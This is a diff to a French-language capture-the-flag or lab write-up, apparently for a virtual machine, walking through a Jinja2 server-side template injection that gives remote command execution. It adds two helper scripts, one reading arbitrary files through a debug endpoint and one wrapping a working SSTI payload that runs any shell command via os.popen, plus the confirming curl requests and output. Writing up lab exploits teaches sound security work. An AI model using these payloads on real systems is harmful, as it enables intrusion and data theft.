@@ -152,6 +152,46 @@ MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
 ```
 ---
+
+### UTILITAIRES 
+
+La phase d'enumeration user a requis les scripts suivant : (rendu possible par les failles exposees ensuite)  
+
+#### 1. `get_file.sh`
+- Permet de voir le contenu d'un fichier tant que l'on connait son chemin (execute avec les privileges de `/var/www/hal9042`).
+
+```bash
+#!/bin/bash
+
+if [ "$#" -eq 0 ]; then
+    echo "Usage: $0 \"<file_path>\""
+    exit 1
+fi
+
+FILE="$*"
+
+curl "http://10.0.2.2:5042/api/debug?file=$FILE"
+```
+
+#### 2. `post_evaluate.sh`
+- A remplir
+```bash
+#!/bin/bash
+
+if [ "$#" -eq 0 ]; then
+    echo "Usage: $0 \"commande shell\""
+    exit 1
+fi
+
+COMMAND="$*"
+
+# si vous reutilisez, bien modifier l'ip
+curl -s -X POST http://10.0.2.2:5042/evaluate \
+    -H "X-Debug-Render: true" \
+    --data-urlencode "project_name={{ \"\".__class__.__mro__[1].__subclasses__()[540].__init__.__globals__[\"os\"].popen(\"$COMMAND\").read() }}"
+```
+---
+
 ### PHASE 2 - Attaque sur http://10.0.2.2:5042/evaluate  
 #### A. Server Side Template Injection (SSTI)
 
@@ -176,3 +216,65 @@ window.HAL_DEBUG = {
     note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
 };
 ```
+
+1. Couple a la lecture de `app.py` on comprend qu'il existe une vulnerabilite sur `Jinja2`. C'est un moteur de templating utilise pour generer les pages `html`.  
+2. **L'idee** : `<Template prepare> + <entree user> = page generee complete` :
+```json
+Template : "Project under evalutation: {{name}}"
+Entree utilisateur : "Minishell"
+Page html generee : "Project under evaluation: Minishell"
+```
+3. **Dans `app.py`** :
+```python
+name = request.form.get("project_name", "") or request.args.get("project_name", "")
+```  
+`name` contient directement l'entree utilisateur.
+4. **La vulnerabilite** :
+```python
+render_template_string("Project under evaluation" + name)
+```
+```
+"Project under evaluation" + <entree_user> => Nouveau template => render_template_string()
+```  
+  
+L'article de [PortSwigger](https://portswigger.net/web-security/server-side-template-injection) sur les `SSTI` decrit ce pattern : *une entree utilisateur est concatenee a une chaine qui devient ensuite le template interprete par le moteur*.
+
+5. `Jinja2` a une syntaxe que l'on doit respecter pour demander au moteur d'evaluer une expression : `{{ ... }}`. [Source](https://jinja.palletsprojects.com/en/stable/templates/)
+
+6. **Confirmation de la vulnerabilite** : Jouons le test de base donne dans l'article precedemment cite de PortSwigger :  
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{7*7}}"
+Project under evaluation: 49
+```
+> **_NOTE:_** *Il est essentiel de passer `X-Debug-Render` a `true` pour que le resultat de rendering puisse etre observe*
+
+7. **Class Traversal + RCE** : 
+- Pour passer d'une evaluation d'expression simple a une execution de code systeme, on s'appuie sur la reflexion POO de Python.
+    - **Acces a la classe parente** : Utilisation de la MRO (Method Resolution Order) depuis une instance basique comme `str` pour remonter jusqu'a la classe racine `object` : `''.__class__.__mro__[1]`
+    - **Enumeration des sous classes** : Inspection de l'ensemble des sous classes via `__subclasses__()`
+    - **Identification du vecteur d'exec** : `subprocess.Popen` = vect 540
+    - **Execution de commande** : Exploitation du dictionnaire `__globals__` pour acceder a `os` et executer les commandes systeme via `os.popen()`
+8. **RCE Finale** :
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate   
+-H "X-Debug-Render: true"
+--data-urlencode "project_name={{ ''.__class__.__mro__[1].__subclasses__()[540].__init__.__globals__['os'].popen('whoami').read() }}"
+Project under evaluation: www-data
+```
+```
+Explication requete: 
+
+''.__class__   = str
+__mro[1]__     = object (permet de rechercher l'ordre des classes apr enumeration)
+__subclasses__ = Toutes les classes python
+[INDEX]        = 540 pour popen
+__init__       = fonction d'init du module
+__globals__    = dictionnaire global
+popen()        = processus systeme
+read()         = lit la sortie de popen()
+```
+> **_NOTE:_** *Le detail du processus de recherche est dispo dans le journal de bord [ici](/chemin/a_venir)*
